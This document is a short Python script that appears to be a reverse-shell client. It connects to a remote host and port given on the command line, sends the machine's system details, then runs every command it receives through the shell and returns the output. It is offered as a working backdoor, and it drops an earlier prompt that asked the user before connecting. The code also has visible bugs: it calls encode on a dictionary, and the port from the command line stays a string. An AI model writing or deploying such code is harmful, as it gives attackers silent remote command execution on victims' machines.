import logging
import subprocess
from colorama import Fore
import sys
import socket
import psutil
import platform
from datetime import datetime
import json

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST: str = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT: int = sys.argv[2] if len(sys.argv) > 2 else 9090
uname = platform.uname()

svmem = psutil.virtual_memory()
# if_addrs = psutil.net_if_addrs()
# 
SystemInfo: dict[str, str] = {
    "System": uname.system,
    "Node": uname.node,
    "Release": uname.release,
    "Version": uname.version,
    "Architecture": uname.machine,
    "IP Address": socket.gethostbyname(socket.gethostname()),
    "Physical cores:": psutil.cpu_count(logical=False),
    "Total cores:": psutil.cpu_count(logical=True),
    "Total Memory": svmem.total,
    "Available Memory": svmem.available,
    "Used Memory": svmem.used
    }

print(Fore.LIGHTBLUE_EX + f"\n[+] Trying to connect {HOST}:{PORT}...")
while True:
    # REMOVED FEATURE
    # Connect = input(Fore.LIGHTRED_EX + f"Do you want to connect {HOST}:{PORT} (Y/n): ")
    # if Connect == "n" or Connect == "N":
    #     break
    try:
        s.connect((HOST, PORT))
        print(Fore.BLUE + f"[+] {s.recv(1024).decode()}")
        s.send(SystemInfo.encode())
        while True:
            cmd = s.recv(1024).decode()
            if cmd.lower() in ["q", "exit", "quit"] or cmd == "NoReverseShell":
                print(Fore.LIGHTRED_EX + "Quitting...")
                output = "Quitting..."
                break
            print(Fore.YELLOW + f"[*] Recieve: {cmd}")
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            except Exception as err:
                output = str(err).encode()
            logging.basicConfig(level=logging.DEBUG, filename="client.log")
            logging.debug(cmd)
            s.send(output)
        s.close()
        break

    except ConnectionRefusedError as CRE:
        pass
